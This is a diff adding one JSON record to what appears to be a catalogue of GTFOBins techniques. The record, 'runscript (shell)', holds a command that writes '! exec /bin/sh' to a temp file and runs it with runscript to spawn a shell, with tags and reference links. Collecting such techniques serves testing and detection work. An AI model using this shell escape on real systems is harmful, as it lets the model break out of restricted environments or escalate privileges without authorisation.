@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-runscript-shell",
+  "name": "GTFOBins · runscript (shell)",
+  "command": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file",
+  "description": "Use runscript to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "runscript",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/runscript/#shell",
+  "upstream_id": "runscript/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/runscript/"
+    }
+  ]
+}
